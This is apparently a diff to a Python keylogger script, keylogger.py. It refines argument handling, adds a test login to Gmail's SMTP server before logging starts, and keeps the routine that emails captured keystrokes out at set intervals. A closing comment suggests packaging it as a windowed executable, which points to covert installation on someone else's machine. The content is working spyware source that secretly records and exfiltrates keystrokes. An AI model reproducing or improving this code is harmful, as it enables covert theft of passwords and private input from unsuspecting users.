@@ -20,20 +20,20 @@ from threading import Semaphore, Timer
 try:
     # sys.argv[1] will take time in seconds as first CLA
     # or we can replace sys.argv[1] with 60 for (1 minute)
-    TIME_INTERVAL = int(sys.argv[1])
+    TIME_INTERVAL = int(sys.argv[1].strip())
     # sys.argv[2] will take email as second CLA
     # or we can replace sys.argv[2] with "email"
-    EMAIL = sys.argv[2]
+    EMAIL = sys.argv[2].strip()
     # sys.argv[3] will take password as third CLA
     # or we can replace sys.argv[3] with "password"
-    PASSWORD = sys.argv[3]
-except IndexError or TypeError:
-    print("Usage :\npython3 keylogger.py \"time_interval_in_seconds\" \"email\" \"password\"")
+    PASSWORD = sys.argv[3].strip()
+except (ValueError, IndexError, TypeError):
+    print("Usage :\npython3 keylogger.py \"time_interval_in_seconds\" \"gmail_email\" \"password\"")
     sys.exit(1)
 
 
 if len(EMAIL) <= 0 or len(PASSWORD) <= 0:
-    print("Enter email and password first...")
+    print("Usage :\npython3 keylogger.py \"time_interval_in_seconds\" \"gmail_email\" \"password\"")
     sys.exit(1)
 
 
@@ -65,15 +65,16 @@ class Keylogger:
                 name = f"[{name.upper()}]"
         self.log += name
 
-    def sendmail(self, email, password, message):
+    def sendmail(self, email, password, message=None):
         # manages a connection with SMTP server of google
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
         # connects to SMTP as TLS mode
         server.starttls()
         # login details
         server.login(email, password)
-        # send actual message
-        server.sendmail(email, email, message)
+        if message is not None:
+            # send actual message
+            server.sendmail(email, email, message)
         # terminates the connection
         server.quit()
 
@@ -90,8 +91,15 @@ class Keylogger:
         self.semaphore.acquire()
 
 
-Keylogger = Keylogger(interval=TIME_INTERVAL)
-Keylogger.start()
+keylogger = Keylogger(interval=TIME_INTERVAL)
+try:
+    keylogger.sendmail(EMAIL, PASSWORD)
+except smtplib.SMTPAuthenticationError:
+    print("Authentication Error!!!\n1. Internet may not be connected or is slow")
+    print("2. Email or Password is incorrect\n3. ACCESS TO LESS SECURE APPS is turned off")
+    sys.exit(1)
+
+keylogger.start()
 
 # convert to window based exe with auto-py-to-exe
 # and pass email and password as command line argument
